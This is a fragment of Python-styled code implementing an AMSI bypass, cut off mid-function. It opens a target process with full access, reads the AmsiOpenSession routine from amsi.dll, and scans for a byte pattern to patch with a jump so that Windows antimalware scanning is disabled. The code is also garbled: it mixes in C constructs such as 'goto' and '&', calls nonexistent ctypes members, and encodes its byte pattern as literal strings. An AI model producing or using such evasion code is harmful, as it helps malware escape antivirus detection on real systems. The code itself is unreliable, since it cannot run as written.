# Define the AMSIOPENSESSION function pointer
AMSIOPENSESSION = ctypes.windll.amsi.AmsiOpenSession

# Define the AmsiPattern and AmsiPatch constants
AmsiPattern = b'0x48?' * 7 + b'0x74?' * 2
AmsiPatch = b'\xeb'

# Define the UnusedSubroutineSearchAmsiPattern function
def UnusedSubroutineSearchAmsiPattern(address, size, pattern, pattern_size):
    for i in range(1024):
        if address[i] == pattern[0]:
            offset = 1
            while offset < pattern_size and i + offset < size and (pattern[offset] == '?' or address[i + offset] == pattern[offset]):
                offset += 1
            if offset == pattern_size:
                return (i + 3)
    return 0

# Define the AmsiBypassViaPatternScan function
def AmsiBypassViaPatternScan(process_id):
    hProcess = ctypes.windll.kernel32.OpenProcess(
        ctypes.windef.PROCESS_ALL_ACCESS, False, process_id
    )
    if hProcess == None:
        return

    hMod = ctypes.windll.kernel32.LoadLibraryW(b"amsi.dll")
    if hMod == None:
        goto EXIT_ROUTINE

    pfnAmsiOpenSession = ctypes.windll.amsi.GetProcAddress(hMod, b"AmsiOpenSession")
    if pfnAmsiOpenSession == None:
        goto EXIT_ROUTINE

    AmsiBuffer = (ctypes.c_char * 1024)()
    if not ctypes.windll.kernel32.ReadProcessMemory(hProcess, pfnAmsiOpenSession, &AmsiBuffer, 1024, None):
        goto EXIT_ROUTINE

    address = UnusedSubroutineSearchAmsiPattern(AmsiBuffer, 1024, AmsiPattern, len(AmsiPattern))
    if address == 0:
